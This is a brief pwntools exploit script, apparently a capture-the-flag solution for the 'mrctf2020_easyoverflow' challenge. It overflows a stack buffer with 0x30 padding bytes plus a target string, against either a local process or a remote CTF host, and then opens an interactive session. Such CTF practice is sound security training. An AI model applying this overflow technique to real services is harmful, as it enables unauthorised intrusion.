#coding:utf-8

from pwn import *
context.log_level = 'debug'
debug = 1



def exp(debug):
	if debug == 1:
		r = process('./mrctf2020_easyoverflow')
		#gdb.attach(r, 'b* $rebase(0x874)')
	else:
		r = remote('node3.buuoj.cn', 26013)

	lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	elf = ELF('mrctf2020_easyoverflow')
	
	sleep(1)

	r.send('a' * 0x30 + 'n0t_r3@11y_f1@g\x00\n')
	r.interactive()



exp(debug)
